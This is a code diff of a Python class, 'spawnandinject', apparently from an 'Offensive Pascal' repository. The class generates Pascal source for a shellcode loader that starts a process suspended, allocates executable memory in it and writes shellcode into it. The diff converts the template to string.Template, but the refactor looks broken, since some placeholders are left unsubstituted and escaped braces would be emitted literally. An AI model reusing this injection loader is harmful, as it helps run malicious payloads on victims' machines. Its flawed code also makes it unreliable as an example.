@@ -1,3 +1,5 @@
+from string import Template
+
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -14,8 +16,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {{
     this one is part of repo published on github under the name of Offensive Pascal
     Pascal is a great and still up to date :)
@@ -53,11 +55,11 @@ begin
     si.cb := SizeOf(si);
     ZeroMemory(@pi, SizeOf(pi));
 
-    CreateProcessA(nil, PAnsiChar('{self.target}'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );
+    CreateProcessA(nil, PAnsiChar('$target'), nil, nil, False, CREATE_SUSPENDED, nil, nil,  si, pi );
 
     
     {transformers}
-    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, {self.memoryPermission});
+    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission);
 
     WriteProcessMemory(pi.hProcess, addr, @shellcode[0], {shellcodeSize}, nil);
 
@@ -69,4 +71,4 @@ end;
 begin
     main;
 end.
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
